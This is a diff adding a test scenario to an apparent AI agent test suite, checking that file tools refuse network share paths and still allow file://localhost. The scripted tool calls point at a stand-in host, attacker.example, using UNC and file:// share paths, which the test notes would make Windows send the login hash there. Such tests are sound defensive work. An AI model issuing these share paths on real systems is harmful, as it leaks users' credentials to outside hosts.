@@ -114,4 +114,23 @@ export const toleranceScenarios = [
 			t.check('the file is unchanged', t.read('notes.txt').includes('hello world') && !t.read('notes.txt').includes('replacement'));
 		},
 	},
+	{
+		name: 'tolerance: a network share path in a file tool is refused with a reason (Windows would send the login hash to that host)',
+		fn: async (t) => {
+			t.use(seq([
+				call('read_file', { uri: '\\\\attacker.example\\share\\notes.txt' }),
+				call('read_file', { uri: '//attacker.example/share/notes.txt' }),
+				call('ls_dir', { uri: 'file://attacker.example/share' }),
+				call('read_file', { uri: 'file://localhost' + (fwd(t.abs('notes.txt')).startsWith('/') ? '' : '/') + fwd(t.abs('notes.txt')) }),
+				{ text: 'Done.' },
+			]));
+			await t.send('read from a share');
+			t.check('the run ends', await t.idle({ timeout: 60_000 }));
+			const r = t.server.chatRequests().slice(1).map(x => x.ctx.lastToolResult ?? '');
+			t.check('a \\\\host\\share path is refused in words', /network share|another computer/i.test(r[0]), r[0].slice(0, 200));
+			t.check('a //host/share path is refused', /network share|another computer/i.test(r[1]), r[1].slice(0, 200));
+			t.check('a file://host/share URL is refused', /network share|another computer/i.test(r[2]), r[2].slice(0, 200));
+			t.check('file://localhost/... is still a normal local file', r[3].includes('hello world'), r[3].slice(0, 160));
+		},
+	},
 ];
